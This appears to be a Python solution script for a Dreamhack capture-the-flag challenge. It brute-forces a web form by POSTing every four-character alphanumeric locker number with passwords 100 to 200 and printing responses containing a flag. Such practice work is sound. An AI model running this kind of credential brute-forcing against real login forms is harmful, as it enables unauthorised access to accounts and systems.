






import requests


HOST = "http://host3.dreamhack.games:23194/"


import string
# brute locker_num
alphanumeric = string.ascii_lowercase + string.digits
alphanumeric = list (alphanumeric)

print(alphanumeric)
# brute number   
for num in range(100, 201):
    for a in (alphanumeric):
        for b in (alphanumeric):
            for c in (alphanumeric):
                for d in (alphanumeric):
                    my_val = str(a) + str(b) + str(c) + str(d)
                    # print(my_val)

                    DATA = {
                        "locker_num":f"{my_val}",
                        "password":f"{num}"
                    }

                    r = requests.post(url=HOST, data=DATA)
                    if "FLAG:" in r.text:
                        print(r.text)
                    
                    if "Good" in r.text:
                        print(r.text)

                    print(f"TRIED {my_val} {num}")


    












